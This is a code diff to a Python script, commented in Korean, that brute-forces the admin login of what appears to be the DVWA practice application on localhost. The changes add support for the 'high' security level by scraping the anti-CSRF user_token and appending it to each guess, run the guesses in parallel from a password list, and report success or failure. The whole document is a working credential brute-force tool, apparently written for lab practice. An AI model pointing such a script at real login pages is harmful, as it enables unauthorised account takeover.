@@ -6,6 +6,7 @@ from multiprocessing import Pool
 import requests
 import bs4
 
+
 '''
 파일을 불러와 tasks라는 변수에 리스트 형식으로 반환
 
@@ -28,17 +29,24 @@ username, password, Login의 값과 Beautifulsoup을 이용해 찾아낸 user_to
 '''
 def session_set():
     with requests.Session() as s:
-        url = "http://localhost/login.php"
+        login_url = "http://localhost/login.php"
+
         login_info = {
             "username": "admin",
             "password": "password",
             "Login": "Login",
             }
 
-        user_token = bs4.BeautifulSoup(s.get(url).text, 'html.parser').select('input[name="user_token"]')[0]['value']
+        global user_token
+        user_token = bs4.BeautifulSoup(s.get(login_url).text, 'html.parser').select('input[name="user_token"]')[0]['value']
         login_info['user_token'] = user_token       # create user_token
 
-        s.post(url, data=login_info)
+        response = s.post(login_url, data=login_info)
+        if "Login failed" in response.text:
+            print("[-] Login failed.")
+            
+        else:
+            print("[+] Login success.")
 
         return s
 
@@ -54,13 +62,15 @@ get요청을 보낸 후 응답코드 200과 response.text값 안에 'Welcome to 
 def brut_force(passwordList):
     s = session_set()
     url = "http://localhost/vulnerabilities/brute/"
-    level = "medium"
+    level = "high"
     head = {"PHPSESSID": s.cookies['PHPSESSID'], "security": level}
+    global user_token
 
     for password in passwordList:
-        param = f"?username=admin&password={password}&Login=Login"
+        param = f"?username=admin&password={password}&Login=Login"        # Medium level
+        param = f"?username=admin&password={password}&Login=Login&user_token={user_token}"      # High level
         payload = url+param
-        print("input password:",password)
+        print("[+] input password:",password)
         response = requests.get(payload, cookies=head)
         # print(response.cookies)
         # print(response.text)
@@ -71,6 +81,7 @@ def brut_force(passwordList):
 
 if __name__ == '__main__':
     num_cores = 8
+    count = 0
     pool = Pool(num_cores)
     filename = 'tools/passwordlist.txt'
     tasks = read_file(filename)
@@ -80,5 +91,10 @@ if __name__ == '__main__':
         if result:
             print("\n\nBruteforce SUCCESS!!")
             print(f"password is \"{result}\".")
-    
 
+        elif result == None:
+            count += 1
+
+        if count == len(tasks):
+            print("\n\nBrut Force failed.")
+            break
